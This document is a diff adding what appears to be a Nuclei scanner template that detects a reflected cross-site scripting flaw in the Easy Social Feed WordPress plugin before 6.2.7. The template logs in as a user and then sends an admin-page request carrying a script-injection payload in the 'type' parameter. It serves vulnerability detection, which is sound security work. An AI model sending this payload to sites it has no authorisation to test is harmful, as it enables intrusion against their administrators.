@@ -1,0 +1,40 @@
+id: easy-social-feed
+
+info:
+  name: Easy Social Feed < 6.2.7 - Reflected Cross-Site Scripting (XSS)
+  author: dhiyaneshDk
+  severity: medium
+  description: The plugin does not sanitise and escape a parameter before outputting back in an admin dashboard page, leading to a reflected Cross-Site Scripting issue which will be executed in the context of a logged admin or editor.
+  reference: https://wpscan.com/vulnerability/6dd00198-ef9b-4913-9494-e08a95e7f9a0
+  tags: wordpress,wp-plugin,xss,authenticated
+
+requests:
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: wordpress_test_cookie=WP%20Cookie%20check
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+      - |
+        GET /wp-admin/admin.php?page=easy-facebook-likebox&access_token=a&type=</script><script>alert(document.domain)</script> HTTP/1.1
+        Host: {{Hostname}}
+
+    cookie-reuse: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "'type' : '</script><script>alert(document.domain)</script>'"
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
